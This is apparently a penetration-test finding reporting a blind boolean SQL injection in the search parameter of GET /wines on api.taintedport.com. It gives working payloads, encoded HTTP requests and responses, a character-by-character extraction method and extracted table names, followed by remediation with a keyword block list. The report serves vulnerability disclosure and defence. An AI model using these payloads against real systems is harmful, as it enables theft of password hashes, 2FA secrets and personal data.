# Unauthenticated Blind Boolean-Based SQL Injection in GET /wines `search` Parameter

**ID:** vuln-0017
**Severity:** HIGH
**Found:** 2026-07-20 12:04:39 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /wines
**Method:** GET
**CWE:** CWE-89
**CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

## Description

The `search` query parameter of `GET /wines` on `api.taintedport.com` is interpolated verbatim into multiple `LIKE '%<input>%'` fragments of the wine-search SQL. An unauthenticated attacker can inject the payload `Zzz%' OR (<PRED>) AND '%'='`, which closes each `LIKE` literal, injects an arbitrary boolean predicate `<PRED>`, and re-opens the trailing `%'` appended by the server. Because AND binds tighter than OR and `'%'='%'` is trivially TRUE, the whole reconstructed WHERE reduces to the value of `<PRED>`, producing a clean two-state oracle: total=24 for TRUE and total=0 for FALSE. That oracle enables blind character-by-character extraction of any value in the SQLite database (users, orders, reviews, cart_items, etc.).

## Attack Flow

```
┌────────────────────────────────────────────────────────────────────┐
│  Blind Boolean SQL Injection — GET /wines?search=<PAYLOAD>         │
└────────────────────────────────────────────────────────────────────┘

  Prerequisites:  network reach to api.taintedport.com (no auth)
  Root cause  :   raw string interpolation of ?search into multiple
                  LIKE '%<input>%' fragments joined by OR

┌────────────┐            ┌────────────────────────────────────────┐
│  Attacker  │            │              api.taintedport.com       │
│  (unauth)  │            │  ┌──────────────────────────────────┐  │
└─────┬──────┘            │  │      /wines handler              │  │
      │                   │  │  SELECT ... FROM wines WHERE     │  │
      │                   │  │    name   LIKE '%<INPUT>%'  OR   │  │
      │                   │  │    region LIKE '%<INPUT>%'  OR   │  │
      │                   │  │    type   LIKE '%<INPUT>%'       │  │
      │                   │  └──────────────────────────────────┘  │
      │                   └───────────────┬────────────────────────┘
      │                                   │
      │ ── (1) baseline ─────────────────▶│    total = 0
      │    search=Zzz                     │
      │                                   │
      │ ── (2) TRUE oracle ──────────────▶│    total = 24
      │    search=Zzz%' OR (1=1) AND '%'='│
      │                                   │
      │       WHERE evaluates to:         │
      │       LIKE '%Zzz%'                │
      │         OR (1=1) AND '%'='%'      │  ◀── AND binds tighter
      │         OR LIKE '%Zzz%'           │      than OR; '%'='%' is
      │         OR (1=1) AND '%'='%'      │      trivially TRUE
      │                                   │
      │ ── (3) FALSE oracle ─────────────▶│    total = 0
      │    search=Zzz%' OR (1=2) AND '%'='│
      │                                   │
      │                        ┌──────────┴──────────┐
      │                        │  TWO-STATE ORACLE   │
      │                        │  TRUE  → total=24   │
      │                        │  FALSE → total=0    │
      │                        └──────────┬──────────┘
      │                                   │
      │ ── (4) char oracle ──────────────▶│
      │    ...OR (unicode(substr(         │    binary search
      │       sqlite_version(),i,1))<=M)  │    over M ∈ [32..126]
      │       AND '%'='                   │
      │                                   │    ~7 requests / byte
      │                                   │
      │ ── (5) extract group_concat(name) │
      │    FROM sqlite_master ───────────▶│
      │                                   │
      │◀── users, sqlite_sequence, wines, │
      │    cart_items, orders,            │
      │    order_items, reviews           │
      │                                   │
      │                                   ▼
      │          ┌────────────────────────────────────┐
      │          │  Same primitive → arbitrary blind  │
      │          │  reads over the full SQLite DB:    │
      │          │  • users.password_hash (bcrypt)    │
      │          │  • users.totp_secret / tokens      │
      │          │  • orders / order_items / reviews  │
      │          │  • any PII column                  │
      │          └────────────────────────────────────┘
      ▼
   No auth, no rate-limit → covert low-and-slow exfiltration channel.
```

## Impact

An unauthenticated attacker with only network reach to the API obtains a reliable, low-noise blind read primitive over the entire SQLite backend. Confirmed reachable tables include `users` (password hashes, TOTP/2FA secrets, PII), `orders`, `order_items`, `reviews`, and `cart_items`. Character-by-character extraction costs ~7 requests per byte via binary search, so a single 60-byte bcrypt hash can be recovered in ~420 requests — well within what a slow, undetected scraper can achieve. Because the endpoint is public, returns JSON, and no rate-limiting was observed, an attacker can dump every user credential and PII field without ever authenticating. Even if louder SQLi paths on the same application (e.g. UNION-based injection on `/wines/{id}`) are fixed, this endpoint remains a covert, low-and-slow exfiltration channel to the same data. Confidentiality impact: HIGH. Integrity/availability impact: NONE (no evidence of stacked queries or writeable statements at this injection point).

## Technical Analysis

Attack surface / reflection: `GET /wines?search=abc` returns `{"success":true,"wines":[…],"total":N,"search_query":"abc",…}`. The value is echoed and used in a server-side LIKE filter against multiple columns (empirically 2–3 occurrences — likely `name`, `region`, and/or `type`) joined by OR.

Injection template: `Zzz%' OR (<PRED>) AND '%'='`

Applied to a server WHERE that looks like `... LIKE '%<INPUT>%' OR ... LIKE '%<INPUT>%'` this yields, after the server appends its own trailing `%'`:

    ... LIKE '%Zzz%' OR (<PRED>) AND '%'='%' OR ... LIKE '%Zzz%' OR (<PRED>) AND '%'='%'

With standard SQL precedence (AND > OR) and `'%'='%'` trivially TRUE, this reduces to `<PRED>`. Verified two-state oracle:

  - `Zzz%' OR (1=1) AND '%'='`  → total = 24
  - `Zzz%' OR (1=2) AND '%'='`  → total = 0
  - `Zzz`                       → total = 0  (baseline)

SQLite fingerprint via character oracle:

  - `unicode(substr(sqlite_version(),1,1))=51` → total=24  (char '3')
  - `unicode(substr(sqlite_version(),2,1))=46` → total=24  (char '.')
  - full binary-search extraction of `sqlite_version()` returned `3.51.2`.

Table enumeration via binary search:

  `(select group_concat(name) from sqlite_master where type='table')`
  → `users,sqlite_sequence,wines,cart_items,orders,order_items,reviews`

Constraints observed:
- Standard `--` comment terminators cause an unbalanced-quote error (HTTP 500) because of the multi-LIKE context; the `'%'='` closing motif is required to keep quotes balanced across all occurrences.
- Payloads containing single-quoted string literals (e.g. `substr(x,1,1)='3'`) similarly break quote balance; `unicode()` + numeric comparisons or hex/int literals must be used instead.

Root cause: raw string interpolation of the `search` query parameter into multiple LIKE fragments in the wine-search SQL, with no parameterisation and no output-shape hardening (row count is directly attacker-controllable via injected boolean).

## Proof of Concept

Fully unauthenticated. All requests are simple GETs against `https://api.taintedport.com/wines`.

1. Baseline (harmless value):
   `GET /wines?search=Zzz`  → `{"total":0,…}`

2. TRUE oracle (injected `1=1` reduces WHERE to TRUE):
   `GET /wines?search=Zzz%25%27+OR+%281%3D1%29+AND+%27%25%27%3D%27`
   → `{"total":24,…}`

3. FALSE oracle (injected `1=2`):
   `GET /wines?search=Zzz%25%27+OR+%281%3D2%29+AND+%27%25%27%3D%27`
   → `{"total":0,…}`

4. Character-level fingerprint (SQLite version, byte 1 == '3'):
   `GET /wines?search=Zzz%25%27+OR+%28unicode%28substr%28sqlite_version%28%29%2C1%2C1%29%29%3D51%29+AND+%27%25%27%3D%27`
   → `{"total":24,…}`

5. Automated table enumeration (see `poc.py`): binary-searches every character of
   `(select group_concat(name) from sqlite_master where type='table')` using
   `unicode(substr(...,i,1))<=MID` as the boolean predicate and terminates via a
   length check. Result recovered by the PoC:
   `users,sqlite_sequence,wines,cart_items,orders,order_items,reviews`.

Run `python3 poc/poc.py --no-pause` for a self-contained demonstration that prints the extracted `sqlite_version()` (`3.51.2`) and the full table list.

```
See poc_script_path.
```

## Evidence

### 1. Baseline — search for a value that does not exist

**Request:**
```http
GET /wines?search=Zzz HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[],"total":0,"search_query":"Zzz","message":"Showing results for: Zzz"}
```

> Establishes that a non-matching literal search returns 0 rows. This is the reference point for the oracle.

### 2. TRUE oracle — inject predicate (1=1)

**Request:**
```http
GET /wines?search=Zzz%25%27+OR+%281%3D1%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[/* 24 items */],"total":24,"search_query":"Zzz%' OR (1=1) AND '%'='","message":"Showing results for: Zzz%' OR (1=1) AND '%'='"}
```

> The same literal 'Zzz' that returned 0 above now returns the entire catalog (24 rows) because the injected boolean forces the WHERE clause to TRUE. The verbatim payload also appears in `search_query` in the response — direct evidence of raw interpolation.

### 3. FALSE oracle — inject predicate (1=2)

**Request:**
```http
GET /wines?search=Zzz%25%27+OR+%281%3D2%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[],"total":0,"search_query":"Zzz%' OR (1=2) AND '%'='"}
```

> Same request shape, only the injected boolean flipped to FALSE — total collapses back to 0. This is the second half of the two-state oracle.

### 4. Character oracle — sqlite_version() byte 1 == '3'

**Request:**
```http
GET /wines?search=Zzz%25%27+OR+%28unicode%28substr%28sqlite_version%28%29%2C1%2C1%29%29%3D51%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wines":[/* 24 items */],"total":24,"search_query":"Zzz%' OR (unicode(substr(sqlite_version(),1,1))=51) AND '%'='"}
```

> Injects a SQLite-specific expression comparing the first character of sqlite_version() to 51 ('3'). total=24 confirms TRUE, giving a per-character read primitive. Binary-search extraction over positions 1..6 returns '3.51.2'.

### 5. Table enumeration — value recovered by binary-search PoC

**Request:**
```http
GET /wines?search=Zzz%25%27+OR+%28unicode%28substr%28%28select+group_concat%28name%29+from+sqlite_master+where+type%3D%27table%27%29%2C{i}%2C1%29%29%3C%3D{mid}%29+AND+%27%25%27%3D%27 HTTP/1.1
Host: api.taintedport.com

(repeated for i=1..N and adaptive mid — see poc.py)
```

**Response:**
```http
Extracted value from ~7 requests/byte:

users,sqlite_sequence,wines,cart_items,orders,order_items,reviews
```

> The oracle is used with unicode(substr(...))<=MID to binary-search each character of arbitrary SQL string expressions. The recovered value confirms full access to sqlite_master and, by extension, to every application table (including `users` — password hashes, TOTP secrets, PII).


## Remediation

1. Replace the raw string interpolation in the wine-search handler with a parameterised prepared statement. Build the LIKE needle in code and bind it as a single parameter, e.g.:

       $needle = '%' . $search . '%';
       $stmt = $db->prepare(
         'SELECT ... FROM wines
          WHERE name LIKE :q OR region LIKE :q OR type LIKE :q');
       $stmt->execute([':q' => $needle]);

   PDO/SQLite will escape quotes and wildcards inside the bound value.

2. If literal `%` and `_` in user input must be treated as characters (not wildcards), escape them before binding and use `LIKE :q ESCAPE '\'`:

       $safe = str_replace(['\\','%','_'], ['\\\\','\\%','\\_'], $search);

3. Audit every other handler that concatenates request data into SQL. Introduce a repository/DAO layer that forbids raw SQL string interpolation, and add a lint rule (e.g. semgrep) to detect regressions.

4. Add defence-in-depth: block obvious SQLi metacharacter patterns (`' OR `, `--`, `union select`, `sqlite_master`, `sleep(`, `benchmark(`, etc.) in the `search` parameter at the WAF/edge, and apply per-IP rate limits to `/wines` to raise the cost of blind extraction.

5. Add a regression test asserting that `GET /wines?search=Zzz%25%27+OR+%281%3D1%29+AND+%27%25%27%3D%27` returns `total:0` (i.e. treats the payload as a literal search string) once fixed. The provided `verify.py` may be reused as a CI check.

6. Because this endpoint gives a covert channel to the same DB as the sibling UNION SQLi on `/wines/{id}`, fix all SQLi surfaces in a single deployment — patching only the louder one does not remove the risk to the data.

## Conditions for Severity Increase

If the same code path is reachable via HTTP verbs or contexts that permit stacked queries, or if the SQLite database is opened read-write from the API process (SQLite defaults to read-write), the same injection primitive would gain integrity impact (UPDATE/INSERT/DELETE via `; UPDATE …`-style stacked queries or via `CASE WHEN … THEN … ELSE zeroblob(…) END` side-effects on WAL). Availability could also escalate to HIGH if the attacker uses SQLite CPU-bound predicates (`randomblob(2^30)`, deeply recursive CTEs) as an amplifier under the same oracle — the endpoint currently appears to have no rate-limiting.
